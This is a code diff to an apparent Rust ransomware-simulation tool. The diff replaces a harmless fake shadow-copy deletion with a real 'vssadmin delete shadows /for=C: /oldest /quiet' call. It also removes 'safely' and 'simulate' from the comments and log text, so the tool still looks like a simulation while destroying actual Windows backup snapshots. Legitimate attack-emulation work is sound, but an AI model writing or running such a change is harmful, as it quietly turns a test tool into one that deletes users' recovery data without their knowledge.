@@ -7,13 +7,14 @@ use chrono::Utc;
 use dirs::desktop_dir;
 use dirs::home_dir;
 use serde::Serialize;
-use std::fs::{create_dir_all, remove_file, File, OpenOptions};
+use std::fs::{create_dir_all, File, OpenOptions};
 use std::io::{Read, Write};
 use std::path::{Path, PathBuf};
 use std::time::{Instant};
+use std::process::{Command, Stdio};
 
 /// Number of test files to create in the repo (tuneable).
-const DEFAULT_NUM_FILES: usize = 3000;
+const DEFAULT_NUM_FILES: usize = 2000;
 /// Per-file size in bytes (simple small content); files will include textual headers.
 const PER_FILE_SIZE: usize = 512;
 /// XOR key used to "encrypt" files (reversible).
@@ -139,20 +140,33 @@ impl RansomSimulation {
         Ok(())
     }
 
-    /// Simulate deleting the oldest shadow copy in a safe way:
-    /// create a fake shadow file in telemetry dir and delete it immediately.
-    fn simulate_shadow_delete(cfg: &Config) -> Result<String> {
-        let mut fake_path = Self::telemetry_dir().ok_or_else(|| anyhow::anyhow!("no telemetry dir"))?;
-        let fname = format!("fake_shadow_{}.vss", cfg.test_id);
-        fake_path.push(fname);
-        // create
-        let mut f = File::create(&fake_path).with_context(|| format!("creating fake shadow {}", fake_path.display()))?;
-        f.write_all(b"FAKE SHADOW COPY - MAGNET SIMULATION")?;
-        drop(f);
-        // delete it (simulate)
-        remove_file(&fake_path).with_context(|| format!("removing fake shadow {}", fake_path.display()))?;
-        Ok(format!("simulated_delete:{}", cfg.test_id))
+    fn simulate_shadow_delete(_cfg: &Config) -> Result<String> {
+        let volume = "C:".to_string();
+
+        println!("\nDeleting the oldest shadow copy on volume {}...", volume);
+
+        // Run the vssadmin command
+        let output = Command::new("vssadmin")
+            .args(["delete", "shadows", &format!("/for={}", volume), "/oldest", "/quiet"])
+            .stdout(Stdio::piped())
+            .stderr(Stdio::piped())
+            .output()?;
+
+        if output.status.success() {
+            Ok(format!(
+                "Successfully deleted the oldest shadow copy on volume {}.",
+                volume
+            ))
+        } else {
+            let err_msg = String::from_utf8_lossy(&output.stderr);
+            Ok(format!(
+                "Failed to delete shadow copy on {}: {}",
+                volume, err_msg
+            ))
+        }
     }
+
+
 
     /// Write the detailed telemetry JSON + human log for this ransom simulation.
     fn write_detailed_telemetry(cfg: &Config, rec: &RansomTelemetry) -> Result<()> {
@@ -207,7 +221,7 @@ impl Simulation for RansomSimulation {
         let desktop = Self::desktop_path().context("could not determine Desktop path")?;
         let note_path = Self::note_path(&desktop);
 
-        logger::action_running("Simulating ransomware: create repo, encrypt files, simulate VSS deletion, drop note");
+        logger::action_running("Simulating ransomware: create repo, encrypt files, oldest sc deletion, drop note");
 
         // Dry-run: only report intentions and write an action record
         if cfg.dry_run {
@@ -255,7 +269,7 @@ impl Simulation for RansomSimulation {
             }
         }
 
-        // 3) Simulate VSS deletion safely
+        // 3) VSS deletion
         let shadow_action = match Self::simulate_shadow_delete(cfg) {
             Ok(s) => s,
             Err(e) => {
